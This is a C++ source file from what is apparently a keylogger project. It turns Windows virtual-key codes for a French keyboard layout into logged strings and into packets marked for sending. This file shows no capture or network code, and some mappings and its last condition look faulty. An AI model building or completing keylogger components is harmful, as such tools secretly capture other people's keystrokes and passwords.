#include "stdafx.h"
#include "keylogger.h"

std::string					translateUpperKey(int code)
{
	if (code == 0x31)
		return ("1");
	else if (code == 0x32)
		return ("2");
	else if (code == 0x33)
		return ("3");
	else if (code == 0x34)
		return ("4");
	else if (code == 0x35)
		return ("5");
	else if (code == 0x36)
		return ("6");
	else if (code == 0x37)
		return ("7");
	else if (code == 0x38)
		return ("8");
	else if (code == 0x39)
		return ("9");
	else if (code == 0x30)
		return ("0");
	else if (code == 0xbc)
		return ("?");
	else if (code == 0xbe)
		return (".");
	else if (code == 0xbf)
		return ("/");
	else if (code == 0xdf)
		return ("§");
	else if (code == 0xdb)
		return ("°");
	else if (code == 0xbb)
		return ("+");
	else if (code == 0xdd)
		return ("¨");
	else if (code == 0xba)
		return ("£");
	else if (code == 0xc0)
		return ("%%");
	else if (code == 0xdc)
		return ("µ");
	else if (code == 0x14)
		return ("");
	else if (code == 0x0D)
		return ("\n");
	else if (code == 0xde)
		return ("");
	else
	{
		std::string r;
		r += (char)code;
		return (r);
	}
}

std::string					translateAltgrKey(int code)
{
	if (code == 0x32)
		return ("~");
	else if (code == 0x33)
		return ("#");
	else if (code == 0x34)
		return ("{");
	else if (code == 0x35)
		return ("[");
	else if (code == 0x36)
		return ("|");
	else if (code == 0x37)
		return ("`");
	else if (code == 0x38)
		return ("\"");
	else if (code == 0x39)
		return ("^");
	else if (code == 0x30)
		return ("@");
	else if (code == 0xdb)
		return ("]");
	else if (code == 0xbb)
		return ("}");
	else if (code == 0xba)
		return ("¤");
	else if (code == 0x45)
		return ("€");
	else
		return ("");
}

std::string						translateNormalKey(int code, int last)
{
	if (code == 0x31)
		return ("&");
	else if (code == 0x32)
		return ("é");
	else if (code == 0x33)
		return ("\"");
	else if (code == 0x34)
		return ("'");
	else if (code == 0x35)
		return ("(");
	else if (code == 0x36)
		return ("-");
	else if (code == 0x37)
		return ("è");
	else if (code == 0x38)
		return ("_");
	else if (code == 0x39)
		return ("ç");
	else if (code == 0x30)
		return ("à");
	else if (code == 0xdb)
		return (")");
	else if (code == 0xbb)
		return ("=");
	else if (code == 0xbc)
		return (",");
	else if (code == 0xbe)
		return (");");
	else if (code == 0xbf)
		return (":");
	else if (code == 0xdf)
		return ("!");
	else if (code == 0xdd)
		return ("^");
	else if (code == 0xba)
		return ("$");
	else if (code == 0xc0)
		return ("ù");
	else if (code == 0xdc)
		return ("*");
	else if (code == 0x14)
		return ("");
	else if (code == 0x20)
		return (" ");
	else if (code == 0x0D)
		return ("<ENTER>\n");
	else if (code == 0x09)
		return ("<TAB>\t");
	else if (code == 0xde)
		return ("²");
	else if (last == 0xA2 && code != 0xA5)
	{
		return ("<CTRL>");
	}
	else if (code == 0xA3)
	{
		return ("<CTRL>");
	}
	else if (code == 0xA4)
	{
		return ("<ALT>");
	}
	else if (code == 0x1b)
		return ("<ESC>");
	else if (code == 0x08)
		return ("<BACKSPACE>");
	else if (code == 0x25)
	{
		return ("<LEFT ARROW>");
	}
	else if (code == 0x26)
	{
		return ("<UP ARROW>");
	}
	else if (code == 0x27)
	{
		return ("<RIGHT ARROW>");
	}
	else if (code == 0x28)
	{
		return ("<DOWN ARROW>");
	}
	else if (code == 0x2E)
		return ("<DELETE>");
	else if (code == 0x23)
		return ("<END>");
	else if (code == 0x21)
		return ("<PAGE UP>");
	else if (code == 0x22)
		return ("<PAGE DOWN>");
	else if (code == 0x24)
		return ("<HOME>");
	else if (code == 0x5b)
	{
		return ("<SUPER>");
	}
	else if (code == 0x70)
		return ("<F1>");
	else if (code == 0x71)
		return ("<F2>");
	else if (code == 0x72)
		return ("<F3>");
	else if (code == 0x73)
		return ("<F4>");
	else if (code == 0x74)
		return ("<F5>");
	else if (code == 0x75)
		return ("<F6>");
	else if (code == 0x76)
		return ("<F7>");
	else if (code == 0x77)
		return ("<F8>");
	else if (code == 0x78)
		return ("<F9>");
	else if (code == 0x79)
		return ("<F10>");
	else if (code == 0x7A)
		return ("<F11>");
	else if (code == 0x7B)
		return ("<F12>");
	else
	{
		std::string r;
		r += (char)(code + 32);
		return (r);
	}
}

void		translateNormalKeyForSending(int code, int last, struct Packet *str)
{
	if (code == 0x31)
		str->value = '&';
	else if (code == 0x32)
		str->value = 'é';
	else if (code == 0x33)
		str->value = '\"';
	else if (code == 0x34)
		str->value = '\'';
	else if (code == 0x35)
		str->value = '(';
	else if (code == 0x36)
		str->value = '-';
	else if (code == 0x37)
		str->value = 'è';
	else if (code == 0x38)
		str->value = '_';
	else if (code == 0x39)
		str->value = 'ç';
	else if (code == 0x30)
		str->value = 'à';
	else if (code == 0xdb)
		str->value = '(';
	else if (code == 0xbb)
		str->value = '=';
	else if (code == 0xbc)
		str->value = ',';
	else if (code == 0xbe)
		str->value = ';';
	else if (code == 0xbf)
		str->value = ':';
	else if (code == 0xdf)
		str->value = '!';
	else if (code == 0xdd)
		str->value = '^';
	else if (code == 0xba)
		str->value = '$';
	else if (code == 0xc0)
		str->value = 'ù';
	else if (code == 0xdc)
		str->value = '*';
	else if (code == 0x0D)
		str->value = '\n';
	else if (code == 0x09)
		str->value = '\t';
	else if (code == 0xde)
		str->value = '²';
	else if (code == 0xA0 || code == 0xA1)
		str->modifier |= Shift;
	else if (last == 0xA2 && code == 0xA5)
		str->modifier |= AltGr;
	else if (last == 0xA2 && code != 0xA5)
		str->modifier |= Ctrl;
	else if (code == 0xA3)
		str->modifier |= Ctrl;
	else if (code == 0xA4)
		str->modifier |= Alt;
	else if (code == 0x25)
	{
		str->modifier |= Arrow;
		str->value = 0;
	}
	else if (code == 0x26)
	{
		str->modifier |= Arrow;
		str->value = 2;
	}
	else if (code == 0x27)
	{
		str->modifier |= Arrow;
		str->value = 1;
	}
	else if (code == 0x28)
	{
		str->modifier |= Arrow;
		str->value = 3;
	}
	else if (code == 0x5b)
		str->modifier |= Super;
	else if (code == 0xA2)
		str->modifier |= Ctrl;
	else if (code != 0x70 && code != 0x71 && code != 0x72 && code != 0x73 && code != 0x74 && code != 0x75 && code != 0x76 && code != 0x77 && code != 0x78 &&
		code != 0x79 && code != 0x7A && code != 0x7B && code != 0x23 && code != 0x21 && code != 0x22 && code != 0x24 && code != 0x14 && code != 0x5D ||
		code != 0x1b || code != 0x08)
		str->value = code;
}